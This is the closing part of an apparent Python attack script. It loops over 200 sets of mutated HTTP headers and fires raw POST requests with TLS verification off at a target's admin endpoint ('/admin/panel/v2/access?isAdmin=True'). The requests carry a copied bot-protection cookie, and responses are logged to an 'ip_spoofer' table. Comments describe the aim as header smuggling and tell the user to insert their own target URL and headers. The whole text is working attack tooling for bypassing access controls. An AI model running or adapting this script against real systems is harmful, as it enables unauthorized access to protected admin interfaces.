    177: mutation_headers177,
    178: mutation_headers178,
    179: mutation_headers179,
    180: mutation_headers180,
    181: mutation_headers181,
    182: mutation_headers182,
    183: mutation_headers183,
    184: mutation_headers184,
    185: mutation_headers185,
    186: mutation_headers186,
    187: mutation_headers187,
    188: mutation_headers188,
    189: mutation_headers189,
    190: mutation_headers190,
    191: mutation_headers191,
    192: mutation_headers192,
    193: mutation_headers193,
    194: mutation_headers194,
    195: mutation_headers195,
    196: mutation_headers196,
    197: mutation_headers197,
    198: mutation_headers198,
    199: mutation_headers199,
    200: mutation_headers200
}

print("Doesn't add a real browswer User-Agent header by default!")

if __name__ == "__main__":
    for mutation_header_key in all_mutation_headers:
        for mutation_header in all_mutation_headers.get(mutation_header_key):
            ##* Modify from here to suite target.

            #* replace target_url string with target FULL URL
            target_full_url = "https://example.com/admin/panel/v2/access?isAdmin=True"  

            raw_hdrs = mutation_header   # verbatim, will NOT be edited

            #* replace required_headers string with headers target requires
            required_headers = """Cookie: datadome=1xlM0MFE3Q0HSqwA2cWg6i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"""

            url_path = target_full_url.replace(get_base_url(target_full_url), "")

            # NOTE: Do NOT include a Content-Length header in `headers` when providing a `body`. The function automatically calculates and adds Content-Length for POST, PUT, PATCH requests.
            headers = parse_headers(required_headers)

            #* Add request body to body_data, if don't wanna add body data leave comment it out.
    #         body_data = """
    # {
    #     "name": "John Doe",
    #     "age": 30,
    #     "isStudent": false
    # }"""

            req_b, req_esc, resp_b, resp_esc = raw_http_request(
                "example.com",
                port=443,
                method="POST", 
                path=url_path,
                # proxy=("127.0.0.1", 9090),  #! Use proxy with caution, as it might reject some requests containing mutated headers sent with the intention of Header Smuggling.
                insecure=True,
                headers=headers,
                raw_headers=raw_hdrs,
                timeout=5,
                # body=body_data
            )

            print("")

            # # Print literal escaped view (shows \r and \n)
            # print(req_esc)
            # If you want the actual bytes repr:
            print(repr(req_b))

            response_code, response_headers, response_body = parse_raw_http_response(raw_response=resp_b)
            print(response_code)
            print(response_headers)

            store_http_response(response_code, response_headers, response_body, payload=repr(raw_hdrs), table_name="ip_spoofer")
